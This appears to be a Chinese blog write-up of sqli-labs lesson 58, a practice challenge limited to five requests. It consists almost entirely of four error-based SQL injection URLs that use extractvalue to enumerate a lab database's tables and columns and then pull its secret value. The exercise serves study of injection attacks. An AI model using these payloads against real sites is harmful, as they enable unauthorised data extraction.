---
title: sqli-labs-lession 58 GET-双注入-变化1-仅允许5次请求
date: 2018-11-29 00:25:10
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs-lession 58 GET-双注入-变化1-仅允许5次请求

---

## 手注

有报错注入

`http://192.168.75.133:8082/Less-58/?id=1'and+extractvalue(null,concat(0x7e,database(),0x7e))%23`

![001](/img/sql/Lesson-58/001.png)

次数不够了,重启...

`http://192.168.75.133:8082/Less-58/?id=1'and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),0x7e))%23`

![002](/img/sql/Lesson-58/002.png)

`http://192.168.75.133:8082/Less-58/?id=1'and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='4wdd58q1in'),0x7e))%23`

![003](/img/sql/Lesson-58/003.png)

`http://192.168.75.133:8082/Less-58/?id=1'and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_SYCF)from challenges.4wdd58q1in),0x7e))%23`

![004](/img/sql/Lesson-58/004.png)

提交

![005](/img/sql/Lesson-58/005.png)